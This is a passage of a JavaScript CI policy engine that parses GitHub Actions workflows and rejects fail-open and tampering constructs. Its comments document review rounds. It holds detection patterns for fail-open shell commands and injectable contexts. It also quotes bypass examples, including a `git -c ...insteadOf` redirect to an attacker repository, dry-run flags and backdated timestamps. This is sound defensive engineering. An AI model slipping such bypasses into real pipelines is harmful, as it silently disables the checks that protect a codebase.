/**
 * Semantic policy for this repo's GitHub Actions workflows.
 *
 * Round 1 of this ticket enforced the same intent with `grep`. A grep over a
 * workflow is not a policy engine: it cannot see that a construct sits on a job
 * rather than a step, it reads a quoted key as different from a bare one, it is
 * blind to YAML aliases, and — the failure that actually mattered — it never
 * runs at all when the job carrying it is skipped by an `if:` the attacker
 * controls. So the rules below run over the *parsed document*, and the `gate`
 * job (rule gate-covers-all-jobs) makes skipping any of them red rather than
 * green.
 *
 * Every rule is a hard failure. There are no warnings: a warning is a fail-open
 * construct wearing a different hat.
 *
 * SCOPE. This engine — and the CI it guards — defends against **accident and
 * drift**: a step deleted in a hurry, a floor quietly lowered, an action tag
 * that moved under us, a job that stopped running and nobody noticed. It does
 * *not* defend against a malicious author with write access, because it cannot:
 * the policy, its self-test, the reporters and the floors all execute from the
 * revision under test, so an author who can edit this file can edit what it
 * checks. The rules below make that expensive and loud, not impossible.
 *
 * Being exact about the four things a green run here does not claim, because
 * "not against a malicious author" is true and too vague to act on:
 *
 *   1. **Not semantics.** The rules pin invocation *shape*. Replacing an assert
 *      script's body with `process.exit(0)` satisfies all of them. And shape is
 *      not reachability: `false && git fetch …` is a real command in command
 *      position, and nothing here evaluates the guard.
 *   2. **Not executable provenance.** Recognition is by command *word*.
 *      `no-command-shadowing` bans the obvious redefinitions; a list of
 *      spellings is not a proof that `git` is git.
 *   3. **Not self-reference-proof.** This file, its self-test, and the README
 *      readback that keeps the prose counts honest all come from the revision
 *      under test — the readback compares a number against prose the same
 *      commit wrote.
 *   4. **Not complete about mutation purity.** A mutation must fire its own
 *      rule and declare any other rule it trips. An *extra* violation of the
 *      same rule goes unnoticed, and an `also` entry's reason is prose.
 *
 * All four are owned by the governance trigger in the README — required-check
 * rulesets, pull requests, and code-owner review, before a second contributor
 * gets write access or this repository goes public. They are recorded here
 * rather than chased, because a check that runs from the revision it judges
 * cannot close any of them at any level of effort.
 *
 * KNOWN GAP, STATED RATHER THAN CHASED: composite-action bodies are not
 * expanded. A step written `uses: ./.github/actions/run-gates` has its real
 * commands in that action's `action.yml`, which this engine never reads, so a
 * required step moved wholesale into a local composite action would read as
 * missing (loud, and therefore safe) while a *prerequisite* moved there would
 * also read as missing (equally loud). Both directions fail closed, which is why
 * this is a note rather than a feature: the repo uses no composite actions
 * today, and the day it does, the presence rules will say so on that commit.
 * Expanding them means resolving and parsing a second file whose own `uses:`
 * chain can recurse — cost that buys nothing until the first one exists.
 *
 * Usage:
 *   node scripts/ci/workflow-policy.mjs .github/workflows
 *   import { checkWorkflow } from './workflow-policy.mjs'
 */

import { readdirSync, readFileSync, statSync } from 'node:fs';
import { isAlias, isCollection, parseDocument, visit } from 'yaml';
import { isMainModule } from './main-module.mjs';
import {
  basename,
  completedCommands,
  firstOperand,
  LAUNCHER_NAMES,
  managerProblems,
  NODE_FLAGS_ALLOWED,
  PACKAGE_MANAGER_NAMES,
  parseScript,
  runsItsScript,
  singleCommandProblems,
} from './shell-command.mjs';

/** A pinned action reference: `owner/repo@<40 hex>`, optionally `owner/repo/path@sha`. */
const PINNED_USES = /^[^@\s]+@([0-9a-f]{40})$/;
/** Local (`./.github/actions/x`) and docker refs are pinned by other means. */
const LOCAL_USES = /^\.\//;
const DOCKER_USES = /^docker:\/\//;
/** `uses:` lines must carry a `# vN.N.N` comment recording the intended major. */
const USES_LINE = /^\s*(?:-\s+)?uses:\s*(\S+)(?:\s+#\s*(.*))?\s*$/;
const VERSION_COMMENT = /v\d+(\.\d+)*/;

/** Shell fragments that turn a failing command into a passing step. */
const FAIL_OPEN_SHELL = [
  { pattern: /\|\|\s*true\b/, label: '`|| true`' },
  { pattern: /\|\|\s*:\s*(?:$|\n|;)/, label: '`|| :`' },
  { pattern: /\|\|\s*exit\s+0\b/, label: '`|| exit 0`' },
  { pattern: /set\s+\+e\b/, label: '`set +e`' },
  { pattern: /set\s+\+o\s+pipefail\b/, label: '`set +o pipefail`' },
  { pattern: /continue-on-error/, label: '`continue-on-error`' },
];

/**
 * The keys that decide *where and in what* a step runs, and the one answer each
 * of them may have.
 *
 * ── THE DEFECT (#40 round 5) ────────────────────────────────────────────────
 * Round 4 derived "an action is a program too" and guarded `uses:` — in the
 * deploy job, once. A container is a runtime too, and nothing in `RULES`
 * inspected the key. A job carrying
 *
 *     container:
 *       image: ghcr.io/somebody/thing@sha256:<40 hex>
 *
 * passed this engine completely clean — the digest even satisfies
 * `pin-actions-to-sha`, which only ever reads `uses:` lines — and every `run:`
 * step of that job then executes inside an image the author chose. `node` is
 * that image's node and `bash` is its bash, so `NODE_FLAGS_ALLOWED`,
 * `INJECTING_VARIABLES`, `no-command-shadowing` and `DEPLOY_ENTRYPOINTS` are all
 * governing argv inside a runtime nobody checked. It breaks the round's fidelity
 * claim independently: `deploy-mutation-ledger.mjs` runs each stage with
 * `execFileSync('bash', ['-e', scriptFile])` **on this host**, while CI would
 * run it in the image — two verifiers describing different executions, which is
 * the exact failure round 4 says it closed.
 *
 * So the sweep, rather than the one site. Everything below changes the machine,
 * the image, or the directory a step executes in:
 *
 *   - `container:` — the whole job runs inside somebody's image.
 *   - `working-directory:` — at workflow `defaults.run`, at job `defaults.run`,
 *     or on a step. The ledger writes each stage's script to a temp file and
 *     runs it from the repository root; a step that ran somewhere else is a step
 *     it replays wrongly, and `../../scripts/ci/x.mjs` resolves differently.
 *   - `runs-on:` — a self-hosted or differently-imaged runner is a different
 *     `bash`, a different `node`, and a `$PATH` this repository has never seen.
 *     The object form (`{group:…, labels:…}`) is refused by the same comparison.
 *   - `uses: docker://…` — a container action, i.e. an image with an entrypoint.
 *     `pin-actions-to-sha` deliberately skips these, so nothing else looks.
 *
 * `services:` is deliberately *not* here, and that is a claim rather than an
 * oversight: a service container is a sidecar the steps talk to over TCP, not
 * something a step runs inside. `verify` and `e2e` both use one for Postgres.
 * If a future GitHub schema adds another key that answers "where does this
 * execute", it belongs in this table, and the fixture beside it is what proves
 * the answer is enforced rather than described.
 *
 * ── ONE THING THIS DOES NOT SEE, STATED RATHER THAN CHASED ─────────────────
 * A published action can itself be a Docker action — `runs: using: docker` in
 * its own `action.yml` — reached by an ordinary `owner/repo@<sha>` ref with no
 * `docker://` anywhere in this file. This engine never reads `action.yml` (the
 * same boundary as the composite-action gap at the top of this file), so it
 * cannot tell that step from a JavaScript one. It is closed where it matters
 * and open where it does not: `deploy` — the job whose execution
 * `deploy-mutation-ledger.mjs` claims to reproduce — allowlists its two actions
 * by name in `DEPLOY_ACTIONS`, so nothing there can be a Docker action without
 * an edit to that list. In `verify` and `e2e` a container action would run in
 * its own image and nothing here would say so; those jobs have no ledger making
 * a fidelity claim about them. Closing it means resolving and parsing a second
 * repository's file, which is cost that buys nothing until the first such
 * action exists.
 */
const RUNTIME_KEYS = {
  container: {
    /** No value at all is admissible: the key itself is the defect. */
    allowed: [],
    why: 'every `run:` step of that job then executes inside an image the author chose, where `node` is its node and `bash` is its bash — so every rule in this file about argv is governing a runtime nobody checked, and `deploy-mutation-ledger.mjs`, which re-executes those same scripts on the host with `bash -e`, is certifying a different execution from the one CI performs',
  },
  'working-directory': {
    allowed: [],
    why: 'the ledger replays each stage from the repository root, the paths in these steps are written relative to it, and a step that ran somewhere else is a step the receipt describes wrongly — put the directory in the command (`pnpm --fail-if-no-match --filter @atrium/db exec …`) where both readers can see it',
  },
  'runs-on': {
    allowed: ['ubuntu-latest'],
    why: 'a self-hosted or differently-imaged runner is a different `bash`, a different `node` and a `$PATH` this repository has never seen, which is the same substitution `no-command-shadowing` refuses one word at a time',
  },
};

/** Untrusted context that must never be interpolated into a shell script. */
const INJECTABLE_CONTEXT =
  /\$\{\{\s*github\.(event\b|head_ref\b|event_name\s*==\s*)|github\.event\.(pull_request|issue|comment|head_commit)/;

const REQUIRED_TRIGGERS = ['pull_request', 'merge_group'];
const GATE_JOB = 'gate';

/**
 * The largest `timeout-minutes` any job in this file may declare.
 *
 * The jobs here are 20 (`verify`), 20 (`e2e`), 30 (`deploy`) and 5 (`gate`), so
 * this is roughly twice the slowest of them: enough for a cold pnpm store, a
 * slow image build and a retried browser download on the same run, and not
 * enough for a hang to matter. GitHub's own ceiling is 4320 minutes — three days
 * — which is not a bound anybody would act on. Raising this is an edit here with
 * a reason beside it; that visibility is the whole content of the rule.
 */
const MAX_JOB_TIMEOUT_MINUTES = 60;

/**
 * Every rule this engine can emit, declared rather than counted by hand.
 *
 * Round 2 of this ticket claimed "15 rules" in a receipt while the engine
 * carried 18, and four of them had never been mutated by the self-test. Both
 * mistakes were possible because the rule set lived only in the call sites. It
 * lives here now: `add()` refuses an undeclared rule id, and the self-test
 * asserts every entry below has at least one mutation proving it fires. The
 * count in any receipt is `RULES.length`, not a number someone remembered.
 */
export const RULES = [
  'yaml-parse',
  'no-yaml-alias',
  'no-yaml-anchor',
  'no-continue-on-error',
  'no-shell-override',
  'no-step-timeout',
  'no-fail-open-shell',
  'no-untrusted-interpolation',
  'required-triggers',
  'least-privilege',
  'pin-actions-to-sha',
  'job-timeout-required',
  'gate-covers-all-jobs',
  'gate-runs-always',
  'gate-inspects-needs',
  'no-job-condition',
  'no-step-condition',
  'no-stray-condition',
  'policy-steps-present',
  'required-job-steps',
  'required-step-prerequisites',
  'no-remote-reusable-workflow',
  'no-command-shadowing',
  'no-runtime-override',
  'package-managers-select-something',
  'protected-steps-run-one-command',
  'compose-through-one-entrypoint',
  'protected-commands-cover-the-verbs',
];

/** The deployment job, whose extra rules are about a stack rather than a repo. */
const DEPLOY_JOB = 'deploy';

/**
 * Command recognition: a parse, not a pattern.
 *
 * ── WHY THIS IS A PARSER (round 6) ──────────────────────────────────────────
 * Round 4 matched required steps and prerequisites by substring, so
 * `echo 'git fetch … refs/heads/main'` satisfied the pair that named the rule
 * while `origin/main` never arrived and the ratchet took its no-baseline exit-0
 * path — policy green *and* runtime green over a fetch that never happened.
 * Round 5 replaced that with a line-start regular expression carrying an
 * optional package-manager prefix:
 *
 *     (?:^|\n)[^\S\n]*(?:(?:pnpm|npm|npx|yarn|bunx?)[^\n]*?\bexec\s+)?
 *
 * and the round-5 gauntlet took nine words to defeat it. `[^\n]*?` between the
 * manager and `exec` is arbitrary text, so
 *
 *     pnpm --version && echo exec node scripts/ci/assert-floor-ratchet.mjs
 *
 * matched: the regex ate through `echo exec ` and matched the tail. Every
 * protected step and every prerequisite fell to that one-line rewrite. The same
 * expression was wrong in the other direction as well — it rejected
 * `(git fetch …)`, `true && git fetch …`, `VAR=x git fetch …`, `sudo …`,
 * `timeout 30 …`, `command git …`, `xargs … git …` and any backslash
 * continuation, while *accepting* `git fetch … &`, which does not establish that
 * the fetch finished before the step that needs it.
 *
 * A guard that is wrong in both directions is worse than the one it replaced, so
 * round 6 does not write a third regex. `shell-command.mjs` tokenizes the script
 * — quoting, escapes, comments, expansions, redirections, here-documents,
 * operators, subshells — and yields simple commands with the word in command
 * position first. A matcher is then a predicate over `argv`, and `echo exec node
 * x` is an `echo` with two arguments no matter how it is spaced. See that file
 * for the four boundaries this deliberately does not cross.
 *
 * That is still a claim about *invocation shape* and nothing more: see the SCOPE
 * note above and the one in ci.yml. It stops `echo node scripts/ci/assert-x.mjs`
 * and `pnpm … echo exec node …` from satisfying a rule; it cannot stop the
 * script's own contents being replaced with `process.exit(0)`, and nothing in a
 * workflow can.
 */

/** Every matcher built below, so the shadowing rule can derive what it protects. */
const MATCHERS = [];

/**
 * The flags each recognised invocation may carry, and why there is a list.
 *
 * ── THE NODE-FLAG LESSON, APPLIED TO ONE BINARY (#40 round 5, third pass) ───
 * Round 4 inverted the node-flag denylist into `NODE_FLAGS_ALLOWED`, because
 * `node --check scripts/ci/assert-page-serves.mjs` parses the file, runs none
 * of it, and satisfies every recognition rule. That argument is not about node.
 * It is about *any* tool with a flag that makes it not do its work, and round 4
 * applied it to `node` and to nothing else. A blind cross-lineage review of
 * this round found what that left, and all five reproduced clean against the
 * engine as committed twenty minutes earlier:
 *
 *     git fetch --dry-run --no-tags --depth=1 origin +refs/heads/main:…
 *     playwright test --list --reporter=list,json
 *     pnpm vitest run -t nomatch_xyz
 *     actionlint -color -version
 *     playwright install --dry-run --with-deps chromium
 *
 * The first is the one that matters most, and it is the ticket's own founding
 * defect wearing a flag: `--dry-run` leaves `origin/main` unfetched, so
 * `assert-floor-ratchet.mjs` takes its documented no-baseline path, prints a
 * polite sentence and exits 0 — a floor lowered in the same pull request sails
 * through the gate that exists to catch it, with the policy green.
 *
 * So every matcher declares the options its invocation may carry, and an
 * invocation carrying anything else reads as **missing**, which is the loud
 * answer — exactly as `runsItsScript` already does for `node`. The polarity is
 * the point: `--dry-run`, `--list`, `-t`, `-version` and the flag the next
 * release adds are one clause, not five.
 *
 * A flag goes on a list here when the workflow uses it, or when somebody argues
 * for it in the same commit that adds it. Short flags are compared whole, so
 * `-sKILL` is refused as a spelling nobody justified — fail-closed, and stated
 * rather than discovered.
 *
 * ── THE VALUE-VS-PRESENCE DEFECT, REPRODUCED INSIDE THIS FIX (#40 round 7) ──
 * The paragraph above used to end: "Values may be attached (`--depth=1`) or
 * separate; a separate value is a bare word and is not checked, because it is
 * data." That sentence was measured wrong by a blind cross-lineage review, in
 * the one entry it mattered for. `-c` was on `FETCHES_BASELINE`'s list by name,
 * so its value was the unchecked bare word the comment describes, and
 *
 *     git -c url.https://github.com/attacker/.insteadOf=https://github.com/lmvdz/ \
 *         fetch --no-tags --depth=1 origin +refs/heads/main:refs/remotes/origin/main
 *
 * was **policy-clean** against the engine as committed: `origin` is named, the
 * refspec is exact, every flag is on the list — and git rewrites the URL before
 * it connects, so `origin/main` ends up pointing at a tree of the author's
 * choosing and `assert-floor-ratchet.mjs` compares this pull request's floors
 * against it. The reviewer's words: "that is the value-vs-presence defect
 * reproduced inside your fix for the value-vs-presence defect". It is the same
 * shape as `--fail-if-no-match=false` in the manager table and as
 * `--disable-warning <script>` in the node-flag table, both of which had already
 * been closed one table at a time — and this table was the one nobody swept.
 *
 * So the entry is the flag *with its arity and its admissible values*, in the
 * polarity every other table in this file already uses. A spec is either
 *
 *   - a plain string, meaning the flag takes **no** value: written with an
 *     attached `=value` it is refused, and a following word is an operand rather
 *     than something the flag consumed; or
 *   - `{flag, value: <RegExp>, separate: true?}`, meaning it may carry a value
 *     the regexp accepts — attached (`--depth=1`) always, and as the next argv
 *     word (`--depth 1`) only when `separate` says the flag is spelled that way.
 *
 * A separate value is *consumed*, so the operand scan below cannot mistake it
 * for a positional — which is the other half of the same fix: `firstOperand` in
 * `shell-command.mjs` does not know which flags take values and reads
 * `git -c protocol.version=2 fetch` as a command whose first operand is
 * `protocol.version=2`. That function is left alone and the operand scan is done
 * here, where the arity is declared.
 */
/**
 * `[spec] → Map<flag, {value, separate}>`, so a list can be written readably and
 * compared cheaply. Declared once and shared: a matcher that needs the operands
 * as well as the verdict (`FETCHES_BASELINE`, `RUNS_ACTIONLINT`) builds its
 * table from the same array it hands to `command()`, so the two can never
 * disagree about which words were options.
 */
function flagTable(specs) {
  const table = new Map();
  for (const spec of specs) {
    if (typeof spec === 'string') {
      table.set(spec, { value: undefined, separate: false });
      continue;
    }
    table.set(spec.flag, { value: spec.value, separate: spec.separate === true });
  }
  return table;
}

/**
 * Walks one argv against a flag table, separating options from operands.
 *
 * @param {string[]} argv the command's words, `argv[0]` being the command itself
 * @param {Map} flags a table from `flagTable()`
 * @returns {{operands: string[]}|null} the positional words, in order, or `null`
 *   when some option word is not one this invocation may carry — an unknown
 *   flag, a value on a flag that takes none, a value the flag's regexp refuses,
 *   or a value-taking flag written with a space when only the attached spelling
 *   is admissible.
 */
function scanOptions(argv, flags) {
  const words = argv ?? [];
  const operands = [];
  for (let index = 1; index < words.length; index += 1) {
    const word = words[index];
    if (!word.startsWith('-') || word === '-' || word === '--') {
      operands.push(word);
      continue;
    }
    const equals = word.indexOf('=');
    const flag = equals === -1 ? word : word.slice(0, equals);
    const spec = flags.get(flag);
    if (spec === undefined) return null;
    if (equals !== -1) {
      // `--no-tags=whatever` on a switch is refused for the reason
      // `--fail-if-no-match=false` is: the other position of a switch is the
      // behaviour the entry was written to refuse.
      if (spec.value === undefined) return null;
      if (!spec.value.test(word.slice(equals + 1))) return null;
      continue;
    }
    if (spec.value === undefined) continue;
    if (!spec.separate) return null;
    const next = words[index + 1];
    if (next === undefined || !spec.value.test(next)) return null;
    index += 1; // Consumed as this flag's value, and therefore not an operand.
  }
  return { operands };
}

class CommandMatcher {
  constructor(describes, names, match, flags) {
    this.describes = describes;
    this.names = names;
    this.flags = flagTable(flags);
    this.match = (command) => match(command) && this.optionsAllowed(command);
  }

  /**
   * True when every option word in this argv is one this invocation may carry,
   * with a value this invocation may give it.
   *
   * `argv`, not `raw`: the launcher's own options are governed by
   * `PROTECTED_STEP_LAUNCHERS`, and asking this about them would refuse
   * `timeout -s TERM 30 git fetch …` for a flag that belongs to `timeout`.
   */
  optionsAllowed({ argv }) {
    return scanOptions(argv, this.flags) !== null;
  }

  /** True when some simple command in `script` runs this, and completes. */
  test(script) {
    return completedCommands(script).some((command) => this.match(command));
  }

  /** Violation messages print this, so a red build says what shape was wanted. */
  toString() {
    return this.describes;
  }
}

/**
 * @param {string} describes what a human should read in a violation message
 * @param {string[]} names the command words this recognition depends on
 * @param {(command: object) => boolean} match predicate over one simple command
 * @param {(string|{flag: string, value: RegExp, separate?: boolean})[]} [flags]
 *   the options this invocation may carry, and the values each may carry; the
 *   default is none at all, which is the allowlist working — a matcher that
 *   needs one says so, and every flag nobody has named reads as "not this
 *   command". A bare string is a flag that takes no value at all.
 */
function command(describes, names, match, flags = []) {
  const matcher = new CommandMatcher(describes, names, match, flags);
  MATCHERS.push(matcher);
  return matcher;
}

/**
 * The node flags a recognised `node <script>` may carry, as option specs.
 *
 * Derived from `NODE_FLAGS_ALLOWED` rather than written out again, because that
 * table is what `runsItsScript` reads and two tables describing one option's
 * arity is the defect this whole ticket is about — it is how
 * `pnpm --fail-if-no-match false …` walked past the pairing rule. `separate` is
 * deliberately absent, i.e. false, for the same reason `runsItsScript` refuses
 * the spaced spelling: `node --disable-warning scripts/ci/assert-x.mjs` makes
 * node swallow the script path as the flag's value, run nothing, and exit 0.
 * The value pattern is `\S+` because these values are diagnostics data — a
 * warning name, a byte count — and nothing here claims otherwise; what makes
 * that admissible is that none of them can load code or change the exit status,
 * which is the entry criterion stated on `NODE_FLAGS_ALLOWED` itself.
 */
const NODE_FLAG_SPECS = [...NODE_FLAGS_ALLOWED].map(([flag, { takesValue }]) =>
  takesValue ? { flag, value: /^\S+$/ } : flag,
);

/**
 * A script being *invoked* under `node`, not merely mentioned.
 *
 * @param directory the directory it lives in, as a regexp source
 * @param script    its filename, as a regexp source
 */
function invokesIn(directory, script) {
  const path = new RegExp(String.raw`^(?:\.\.\/)*${directory}\/${script}$`);
  const shown = `${directory}/${script}`.replace(/\\/g, '');
  return command(
    `\`node …/${shown}\``,
    ['node'],
    ({ argv }) => {
      if (argv[0] !== 'node') return false;
      // `node --check x.mjs` parses the file, exits 0, and runs none of it —
      // and it is one unconditional command with the script as its first
      // operand, so the shape rule cannot see it either. Found by a blind
      // cross-lineage review of the first version of that rule. A node
      // invocation that is not going to run the script reads as *missing*.
      if (!runsItsScript(argv)) return false;
      const operand = firstOperand(argv);
      return operand !== undefined && path.test(operand);
    },
    // `runsItsScript` already governs which node flags are admissible and why —
    // this is the same set, with the same arity, handed to the option gate so
    // the two cannot disagree. A node flag nobody justified reads as "not this
    // invocation" from both directions.
    NODE_FLAG_SPECS,
  );
}

/** A script in `scripts/ci/` being *invoked*, not merely mentioned. */
function invokes(script) {
  return invokesIn(String.raw`scripts\/ci`, script);
}

/**
 * The policy engine pointed at the whole workflow directory.
 *
 * ── TWO DEFECTS, ONE STEP (#40 round 6) ─────────────────────────────────────
 * The step used to read `node scripts/ci/workflow-policy.mjs
 * .github/workflows/*.yml`, and the rule that required it was
 * `invokes('workflow-policy\\.mjs')` — the script by name, its argument
 * unexamined.
 *
 *  1. `*.yml` is not the set GitHub runs. `.github/workflows/x.yaml` is a
 *     workflow by every rule GitHub applies and by none of the rules in this
 *     file, because the glob never named it. A whole workflow, invisible.
 *  2. The argument being unchecked is the value-vs-presence class again: `node
 *     scripts/ci/workflow-policy.mjs /dev/null` satisfies `invokes`, prints
 *     "clean", and exits 0 having read nothing.
 *
 * Both close the same way. The engine takes the *directory* and enumerates it
 * — `.yml`, `.yaml`, and anything added later, with an empty directory a hard
 * error rather than a green run over nothing — and the rule requires that
 * operand to be the directory. What is checked is no longer a glob some shell
 * expanded before anyone could look at it.
 */
/** Where GitHub looks for workflows, and therefore where this engine must. */
const WORKFLOW_DIRECTORY = '.github/workflows';

const CHECKS_ALL_WORKFLOWS = command(
  '`node scripts/ci/workflow-policy.mjs .github/workflows`',
  ['node'],
  ({ argv }) => {
    if (argv[0] !== 'node' || !runsItsScript(argv)) return false;
    const script = firstOperand(argv);
    if (script === undefined || !/^(?:\.\.\/)*scripts\/ci\/workflow-policy\.mjs$/.test(script)) {
      return false;
    }
    const operand = firstOperand(argv, argv.indexOf(script) + 1);
    return operand === WORKFLOW_DIRECTORY || operand === `${WORKFLOW_DIRECTORY}/`;
  },
  NODE_FLAG_SPECS,
);

/**
 * A package.json script run through the workspace's package manager.
 *
 * `via` rather than `raw[0]`, so `sudo pnpm build` and `timeout 60 pnpm lint`
 * are the same claim as `pnpm build` — the launcher is not what makes it one.
 */
function packageScript(name) {
  return command(`\`pnpm ${name}\``, [...PACKAGE_MANAGER_NAMES], ({ via, argv }) => {
    return via.some(({ name: word }) => PACKAGE_MANAGER_NAMES.includes(word)) && argv[0] === name;
  });
}

/** A binary and its subcommand, however the package manager reaches it. */
function binary(name, flags, ...subcommand) {
  const shown = [name, ...subcommand].join(' ');
  return command(
    `\`${shown}\``,
    [name],
    ({ argv }) => {
      if (basename(argv[0]) !== name) return false;
      return subcommand.every((word, index) => argv[index + 1] === word);
    },
    flags,
  );
}

/**
 * A run-scoped variable being *exported to the rest of the job*.
 *
 * `echo "VITEST_RUN_START=$(date +%s%3N)"` prints a line; only the redirection
 * into `$GITHUB_ENV` makes the later gate able to read it. Round 4 matched
 * `/\bVITEST_RUN_START=/`, which a comment about the timestamp satisfies as
 * happily as the assignment does. Round 5 required the redirection but wrote the
 * target as `\$\{?GITHUB_ENV\b`, which `>> "$GITHUB_ENV.bak"` satisfies — a word
 * boundary sits between `V` and `.`, so a file nobody reads passed as the job
 * environment. The target is now compared as a whole word: exactly
 * `$GITHUB_ENV` or `${GITHUB_ENV}`, and the `$` must be live rather than
 * single-quoted, because `>> '$GITHUB_ENV'` writes a file with a funny name and
 * exports nothing at all.
 */
// biome-ignore lint/suspicious/noTemplateCurlyInString: shell parameter expansion, quoted verbatim
const JOB_ENV_FILE = new Set(['$GITHUB_ENV', '${GITHUB_ENV}']);

/**
 * The value has to be *computed*, and this is the whole of round 6's sweep.
 *
 * ── THE DEFECT (#40 round 6) ────────────────────────────────────────────────
 * Rounds 4 and 5 argued about where `VITEST_RUN_START=` had to appear and what
 * it had to be redirected into. Nothing ever looked at the value. Measured on
 * r5 as committed:
 *
 *     run: echo "VITEST_RUN_START=0" >> "$GITHUB_ENV"
 *
 * is policy-clean, and `report-file.mjs` then computes `stat.mtimeMs + 1000 <
 * 0`, which is false for every file that has ever existed. Every report is
 * "fresh". That is the entire cached-or-leftover-report class the reset/gate
 * pair exists for, wide open, with the only remaining line of defence being
 * that the `rm -f` step happens to still run.
 *
 * It is the same shape as round 5's own `--fail-if-no-match=false` finding — a
 * rule about a name where the meaning lives in a value — so the sweep was run
 * over every matcher in this file rather than over this one. Three came back:
 * this, `FETCHES_BASELINE`'s refspec (the word `refs/heads/main` appearing
 * somewhere is not `origin/main` resulting), and the policy engine's own
 * argument (`invokes('workflow-policy\\.mjs')` did not care *what* it was
 * pointed at). The rest are value-checked already (`composeStack` pins the
 * verb, `deletesReports` pins the filenames, `binary` pins the subcommand) or
 * fail closed at runtime with the wrong value, and that is written down beside
 * each one rather than assumed.
 *
 * A timestamp is either `$(date …)` or a lie. `%s%3N` is not required here —
 * `date +%s` is wrong by a factor of a thousand rather than dishonest, and
 * `report-file.mjs` refuses it as implausible at runtime. Two halves, neither
 * of which can be satisfied by satisfying the other.
 */
// The path prefix is not decoration: `$(/usr/bin/date +%s%3N)` is a legitimate
// hardening spelling and the first version of this regex refused it, which a
// blind review measured as a false red.
//
// ── THE CLOCK THAT CAN BE TOLD WHAT TIME IT IS (#40 round 7) ────────────────
// Round 6 required only that the value come from a *command called `date`*, and
// wrote down, as a stated boundary, that `date --date=@1748736000 +%s%3N` reads
// a clock and satisfies it — the argument being that `report-file.mjs` refuses a
// timestamp that is not within a day of now, so a literal stops working a day
// after it is written. That argument is true of a *literal* and false of the
// thing an author would actually write. Measured against the engine as
// committed:
//
//     run: echo "VITEST_RUN_START=$(date -d -5hours +%s%3N)" >> "$GITHUB_ENV"
//
// is policy-clean, and it is a *relative* offset — it is within a day of now on
// every run, for ever, so `report-file.mjs`'s plausibility window admits it, and
// its 6h `MAX_RUN_AGE_MS` admits it too. What it defeats is the freshness
// comparison the pair exists for: a `vitest-report.json` left on disk two hours
// before the suite started now post-dates the recorded start, so a report of a
// run that never happened is certified fresh. The honest value reports "is
// stale: last written 7200s before vitest started"; the backdated one reports no
// problems at all. Two halves, and one line satisfied both.
//
// So the whole argv is the entry, not the command word: `date` and `+%s%3N`,
// with an optional absolute path to the binary, and nothing else. `-d`,
// `--date`, `-r`, `--reference`, `-u`, and the flag the next coreutils release
// adds are one clause rather than five, in the polarity every other table in
// this file has been inverted into.
//
// What this does *not* claim, because the rule is a matcher and matchers answer
// about one command: it governs the step that *satisfies the prerequisite*, not
// every write of that name. A second step between the suite and the report gate
// writing `VITEST_RUN_START=$(date -d -5hours +%s%3N) >> "$GITHUB_ENV"` sets the
// variable the gate actually reads, and nothing here refuses it — the name is
// declared, the writer is `echo`, and `required-step-prerequisites` is already
// satisfied by the honest step further up. The same was true of round 6 and of
// `VITEST_RUN_START=0`; it is recorded here rather than left to be discovered,
// and closing it means a rule about how many times a job may write one variable.
/** Every `$( … )` or backtick substitution in one word, innermost text only. */
const SUBSTITUTION = /\$\(([^()]*)\)|`([^`]*)`/g;
/** The one command a run-start timestamp may be read from, whole. */
const CLOCK_READ = /^(?:[^\s()`]*\/)?date\s+\+%s%3N$/;

/** The text inside every command substitution in `word`, trimmed. */
function substitutions(word) {
  return [...String(word).matchAll(SUBSTITUTION)].map((found) =>
    (found[1] ?? found[2] ?? '').trim(),
  );
}

function exportsToJobEnv(name) {
  return command(
    `\`echo ${name}=$(date +%s%3N) >> "$GITHUB_ENV"\``,
    ['echo', 'printf'],
    ({ argv, redirections }) => {
      if (argv[0] !== 'echo' && argv[0] !== 'printf') return false;
      if (!(firstOperand(argv) ?? '').startsWith(`${name}=`)) return false;
      // Any operand, not only the first: `printf "NAME=%s\n" "$(date +%s%3N)"`
      // is the same claim spelled with the value in the second word.
      const read = argv.slice(1).flatMap(substitutions);
      // At least one — a constant is not a timestamp (`VITEST_RUN_START=0` makes
      // `mtime + 1000 < 0` false for every file that has ever existed) — and
      // *every* one, because `$(date +%s%3N)$(something-else)` is one word with
      // two commands in it and only the allowlist polarity refuses the second
      // without having heard of it. A nested substitution this regexp cannot
      // read matches nothing, so it fails closed here too.
      if (read.length === 0 || !read.every((one) => CLOCK_READ.test(one))) return false;
      return redirections.some(
        ({ op, target }) =>
          (op === '>>' || op === '>') && target.expandable && JOB_ENV_FILE.has(target.value),
      );
    },
  );
}

/**
 * ── PREREQUISITES (round 4) ─────────────────────────────────────────────────
 * Round 3 required each assert script to be present and stopped there, and the
 * round-3 gauntlet found the hole that leaves: `assert-floor-ratchet.mjs` is
 * only a ratchet because the step *before* it fetches `origin/main`. Delete the
 * fetch — one line, the sort of thing a rebase does without malice — and the
 * assertion still runs, finds no baseline, says so politely, and exits 0. The
 * gate is present, named, invoked, and comparing against nothing.
 *
 * So a required step may declare what it depends on, and the policy enforces
 * the pair: the prerequisite must be in the same job *and* run before it.
 * Presence alone is not the property that matters — a report reset that happens
 * after the run it is meant to precede is as useless as one that is missing.
 *
 * The rule is general on purpose. Every assert script below was re-examined for
 * a setup dependency and the ones that have one now declare it, so the next
 * script to acquire one has an obvious place to say so rather than a comment
 * nobody reads. The ratchet's pair is the only one that failed *open* on its
 * own — the rest already went red at runtime when their setup was missing (a
 * report gate with no run-start timestamp refuses to prove freshness;
 * `assert-tables.mjs` against an unmigrated database finds an empty table set;
 * `assert-chromium.mjs` without an install finds no browser). Declaring them
 * moves the failure from the middle of a CI run to the edit that caused it, and
 * the ordering half of the rule is new information for every one of them.
 *
 * How many there are is `PREREQUISITE_PAIRS.length`, derived below and printed
 * by the self-test — not a number in this comment. A first draft of it said
 * "five" and the table already held nine, which is round 2's rule-count mistake
 * reappearing in a fresh place within a day of being fixed elsewhere.
 *
 * `policy-steps-present` covers the meta-guards: the things that check the
 * workflow itself. `required-job-steps` covers the verification work.
 * `required-step-prerequisites` covers what has to have happened first.
 *
 * ── ROUND 5 ─────────────────────────────────────────────────────────────────
 * All of that was true and matched by substring, which meant the rule's own
 * motivating case still passed when the fetch was quoted into an `echo`. Every
 * test below now goes through COMMAND_POSITION, so a prerequisite has to be a
 * command and not a sentence about one. See that comment for the receipt.
 */

/**
 * The commands the pairs below are about, each matched at command position.
 *
 * Declared once and shared, because several of them are both a required step in
 * their own right and another step's prerequisite: `drizzle-kit migrate` has to
 * exist *and* has to come after the wait for Postgres *and* has to come before
 * the schema assertion. One matcher per command means the two rules can never
 * drift into disagreeing about what "the migrations ran" means.
 */
/**
 * `-color` and `--color` are switches: they choose whether the output is
